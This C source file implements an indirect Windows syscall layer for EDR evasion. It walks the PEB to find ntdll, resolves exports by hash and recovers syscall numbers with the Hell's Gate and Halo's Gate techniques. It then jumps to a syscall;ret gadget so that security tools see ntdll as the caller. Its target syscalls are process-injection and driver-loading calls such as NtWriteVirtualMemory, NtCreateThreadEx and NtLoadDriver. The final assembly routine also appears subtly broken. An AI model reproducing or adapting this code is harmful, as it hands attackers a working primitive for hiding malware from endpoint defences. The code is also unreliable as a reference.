/*
 * jrt-core: Indirect Windows syscall layer.
 *
 * Architecture:
 *   1. Walk PEB to find ntdll.dll base address
 *   2. Parse ntdll's export table to resolve function RVAs
 *   3. For each function, extract the SSN (System Service Number)
 *   4. Find a syscall;ret gadget inside ntdll's .text section
 *   5. At call time: load SSN into eax, jump to the gadget
 *
 * This ensures the `syscall` instruction is NEVER in our code pages.
 * EDR stack-walking sees ntdll as the caller, not our binary.
 */

#include "syscall/syscall_win.h"  /* NT structures + API name hashes */
#include <stdint.h>
#include <stddef.h>

/* ── DJB2 hash function ─────────────────────────────────────────── */
uint32_t jrt_djb2_hash(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

/* ── Syscall entry: resolved SSN + gadget address ───────────────── */
typedef struct {
    uint32_t hash;         /* DJB2 hash of function name        */
    uint16_t ssn;          /* System Service Number              */
    void*    gadget_addr;  /* Address of syscall;ret in ntdll    */
} SyscallEntry;

/* Global table — filled by jrt_resolve_syscalls() */
#define MAX_SYSCALLS 64
static SyscallEntry g_syscall_table[MAX_SYSCALLS];
static int          g_syscall_count = 0;

/* ── PEB walk: find ntdll.dll base ──────────────────────────────── */
static void* find_ntdll_base(void) {
    /* Read PEB from TEB (Thread Environment Block)
     * On x86-64: TEB is at gs:[0x30], PEB is at TEB+0x60
     * PEB→Ldr is at PEB+0x18
     * Ldr→InMemoryOrderModuleList is at Ldr+0x20
     */
    void* peb;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));

    /* PEB→Ldr (offset 0x18) */
    void* ldr = *(void**)((uint8_t*)peb + 0x18);

    /* Ldr→InMemoryOrderModuleList (offset 0x20)
     * This is a LIST_ENTRY pointing to LDR_DATA_TABLE_ENTRY structures.
     * The list order is: exe → ntdll → kernel32 → ...
     */
    void* list_head = (uint8_t*)ldr + 0x20;
    void* entry = *(void**)list_head;  /* First entry (the exe itself) */

    /* Walk the list:
     *   Entry+0x00 = Flink (next entry)
     *   Entry+0x20 = DllBase
     *   Entry+0x40 = BaseDllName (UNICODE_STRING: len at +0, buf at +8)
     */
    while (entry != list_head) {
        void* dll_base = *(void**)((uint8_t*)entry + 0x20);
        uint16_t name_len = *(uint16_t*)((uint8_t*)entry + 0x40);
        uint16_t* name_buf = *(uint16_t**)((uint8_t*)entry + 0x48);

        /* Check for "ntdll.dll" (case-insensitive, wide chars) */
        if (name_len >= 9 * 2) {
            if ((name_buf[0] | 0x20) == 'n' &&
                (name_buf[1] | 0x20) == 't' &&
                (name_buf[2] | 0x20) == 'd' &&
                (name_buf[3] | 0x20) == 'l' &&
                (name_buf[4] | 0x20) == 'l') {
                return dll_base;
            }
        }

        entry = *(void**)entry;  /* Flink → next */
    }

    return 0;  /* ntdll not found (should never happen) */
}

/* ── Parse ntdll export table + extract SSNs ────────────────────── */
/*
 * Hell's Gate / Halo's Gate SSN extraction:
 *   Clean ntdll syscall stub pattern (x86-64):
 *     4C 8B D1        mov r10, rcx
 *     B8 XX XX 00 00  mov eax, <SSN>
 *     ...
 *     0F 05           syscall
 *     C3              ret
 *
 * If the stub is hooked (first bytes differ), use Halo's Gate:
 *   scan neighboring functions (+/- 0x20 bytes) for the pattern,
 *   then compute: SSN = neighbor_SSN ± offset
 */
static int extract_ssn(void* func_addr) {
    uint8_t* p = (uint8_t*)func_addr;

    /* Clean stub: 4C 8B D1 B8 XX XX 00 00 */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(uint16_t*)(p + 4);
    }

    /* Halo's Gate: function is hooked, scan neighbors */
    /* Each syscall stub is ~32 bytes apart */
    for (int offset = 1; offset < 500; offset++) {
        /* Check UP: func_addr - (offset * 0x20) */
        uint8_t* up = p - (offset * 0x20);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            uint16_t neighbor_ssn = *(uint16_t*)(up + 4);
            return neighbor_ssn + offset;
        }

        /* Check DOWN: func_addr + (offset * 0x20) */
        uint8_t* down = p + (offset * 0x20);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            uint16_t neighbor_ssn = *(uint16_t*)(down + 4);
            return neighbor_ssn - offset;
        }
    }

    return -1;  /* Could not resolve SSN */
}

/* ── Find syscall;ret gadget in ntdll .text section ─────────────── */
static void* find_syscall_ret_gadget(void* ntdll_base) {
    /* Parse PE headers to find .text section boundaries */
    uint8_t* base = (uint8_t*)ntdll_base;
    uint32_t pe_offset = *(uint32_t*)(base + 0x3C);
    uint8_t* pe = base + pe_offset;

    uint16_t num_sections = *(uint16_t*)(pe + 4 + 2);
    uint16_t opt_hdr_size = *(uint16_t*)(pe + 4 + 16);
    uint8_t* sections = pe + 4 + 20 + opt_hdr_size;

    for (int i = 0; i < num_sections; i++) {
        uint8_t* sec = sections + (i * 40);
        /* Check if this is .text (executable) */
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e') {
            uint32_t sec_rva  = *(uint32_t*)(sec + 12);
            uint32_t sec_size = *(uint32_t*)(sec + 8);
            uint8_t* sec_data = base + sec_rva;

            /* Scan for 0F 05 C3 (syscall; ret) */
            for (uint32_t off = 0; off < sec_size - 3; off++) {
                if (sec_data[off]   == 0x0F &&
                    sec_data[off+1] == 0x05 &&
                    sec_data[off+2] == 0xC3) {
                    return sec_data + off;
                }
            }
        }
    }

    return 0;
}

/* ── Resolve all syscalls ───────────────────────────────────────── */
int jrt_resolve_syscalls(void) {
    void* ntdll = find_ntdll_base();
    if (!ntdll) return -1;

    void* gadget = find_syscall_ret_gadget(ntdll);
    if (!gadget) return -2;

    /* Parse ntdll export table */
    uint8_t* base = (uint8_t*)ntdll;
    uint32_t pe_off = *(uint32_t*)(base + 0x3C);
    /* Export directory is data directory[0] */
    uint32_t export_rva = *(uint32_t*)(base + pe_off + 4 + 20 + 112);
    uint8_t* exports = base + export_rva;

    uint32_t num_names     = *(uint32_t*)(exports + 24);
    uint32_t* name_rvas    = (uint32_t*)(base + *(uint32_t*)(exports + 32));
    uint16_t* ordinals     = (uint16_t*)(base + *(uint32_t*)(exports + 36));
    uint32_t* func_rvas    = (uint32_t*)(base + *(uint32_t*)(exports + 28));

    /* Target syscall hashes */
    uint32_t targets[] = {
        HASH_NtAllocateVirtualMemory,
        HASH_NtProtectVirtualMemory,
        HASH_NtWriteVirtualMemory,
        HASH_NtCreateSection,
        HASH_NtMapViewOfSection,
        HASH_NtUnmapViewOfSection,
        HASH_NtCreateThreadEx,
        HASH_NtQueueApcThread,
        HASH_NtSetContextThread,
        HASH_NtGetContextThread,
        HASH_NtSuspendThread,
        HASH_NtResumeThread,
        HASH_NtClose,
        HASH_NtQuerySystemInformation,
        HASH_NtQueryVirtualMemory,
        HASH_NtSetInformationFile,
        HASH_NtCreateFile,
        HASH_NtReadFile,
        HASH_NtWriteFile,
        HASH_NtDeviceIoControlFile,
        HASH_NtLoadDriver,
    };
    int num_targets = sizeof(targets) / sizeof(targets[0]);

    for (uint32_t i = 0; i < num_names && g_syscall_count < MAX_SYSCALLS; i++) {
        const char* name = (const char*)(base + name_rvas[i]);
        uint32_t hash = jrt_djb2_hash(name);

        for (int t = 0; t < num_targets; t++) {
            if (hash == targets[t]) {
                void* func = base + func_rvas[ordinals[i]];
                int ssn = extract_ssn(func);
                if (ssn >= 0) {
                    g_syscall_table[g_syscall_count].hash = hash;
                    g_syscall_table[g_syscall_count].ssn  = (uint16_t)ssn;
                    g_syscall_table[g_syscall_count].gadget_addr = gadget;
                    g_syscall_count++;
                }
                break;
            }
        }
    }

    return g_syscall_count;
}

/* ── Indirect syscall invocation ────────────────────────────────── */
/*
 * This is the core primitive. It:
 *   1. Loads the resolved SSN into eax
 *   2. Moves the first argument into r10 (Windows x64 syscall ABI)
 *   3. Jumps to the syscall;ret gadget inside ntdll
 *
 * The return address on the stack points inside ntdll, not our code.
 */
static SyscallEntry* find_entry(uint32_t hash) {
    for (int i = 0; i < g_syscall_count; i++) {
        if (g_syscall_table[i].hash == hash) return &g_syscall_table[i];
    }
    return 0;
}

/* Generic indirect syscall — up to 11 args (Windows max) */
__attribute__((naked))
long jrt_syscall(uint32_t hash, ...) {
    __asm__ volatile (
        /* The plan's body is Intel-syntax; GCC/Clang inline asm defaults to
         * AT&T, so switch syntax around it. */
        ".intel_syntax noprefix\n"
        /* Save hash (rcx on entry) and look up the entry */
        "push rbx\n"
        "push rsi\n"
        "mov esi, ecx\n"            /* hash → esi */

        /* Call find_entry(hash) — returns SyscallEntry* in rax */
        "call find_entry\n"
        "test rax, rax\n"
        "jz .Lfail\n"

        /* Load SSN into eax */
        "movzx eax, word ptr [rax + 4]\n"   /* entry→ssn */
        /* Load gadget address into rbx */
        "mov rbx, [rax + 8]\n"              /* entry→gadget_addr */

        /* Shift arguments: arg1→rcx, arg2→rdx, arg3→r8, arg4→r9
         * The variadic args start after 'hash', so:
         *   va_arg[0] = rdx on entry (arg1 of the real NT function)
         *   va_arg[1] = r8 on entry
         *   va_arg[2] = r9 on entry
         *   va_arg[3+] = on stack
         * We need: rcx = va_arg[0], rdx = va_arg[1], etc.
         * Windows x64 ABI for syscalls: r10 = rcx (before syscall)
         */
        "mov rcx, rdx\n"    /* first real arg */
        "mov rdx, r8\n"     /* second real arg */
        "mov r8, r9\n"      /* third real arg */
        "mov r9, [rsp+0x48]\n"  /* fourth real arg (from stack) */
        "mov r10, rcx\n"    /* syscall ABI: r10 = first arg */

        /* Jump to gadget (syscall; ret) inside ntdll */
        "pop rsi\n"
        "pop rbx\n"
        "jmp rbx\n"

        ".Lfail:\n"
        "mov eax, 0xC0000001\n"  /* STATUS_UNSUCCESSFUL */
        "pop rsi\n"
        "pop rbx\n"
        "ret\n"
        ".att_syntax prefix\n"
    );
}
